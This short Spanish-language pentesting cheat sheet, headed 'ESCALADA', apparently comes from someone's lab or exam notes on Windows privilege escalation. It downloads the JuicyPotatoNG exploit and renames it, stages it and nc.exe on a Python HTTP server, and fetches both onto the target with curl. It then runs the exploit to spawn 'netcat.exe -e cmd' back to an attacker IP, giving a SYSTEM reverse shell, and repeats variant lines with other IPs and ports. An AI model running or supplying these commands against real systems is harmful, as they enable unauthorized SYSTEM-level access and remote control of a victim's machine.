
# ESCALADA
```shell
#NOS DESCARGAMOS EL RECURSO
wget https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip
unzip JuicyPotatoNG.zip
mv JuicyPotatoNG.exe pivesc.exe

#NOS TRAEMOS EL NC
cp /usr/share/windows-resources/binaries/nc.exe .

#SERVIDOR CON PYTHON
python3 -m http.server 80

#NOS LO TRANSFERIMOS JUNTO AL NETCAT
curl http://192.168.45.189/pivesc.exe -o pivesc.exe
curl http://192.168.45.189/nc.exe -o netcat.exe

#LO EJECUTAMOS
nc -nlvp 446
.\pivesc.exe -t * -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\privesc\netcat.exe -e cmd 192.168.45.189 446" -l 446
```

.\pivesc.exe -t * -p C:\Windows\System32\cmd.exe -a "/c C:\windows.old\Windows\System32\netcat.exe -e cmd 10.10.208.147 1234" -l 1234

curl http://10.10.208.147:2341/privesc.exe -o privesc.exe

curl http://192.168.45.189/pivesc.exe -o pivesc.exe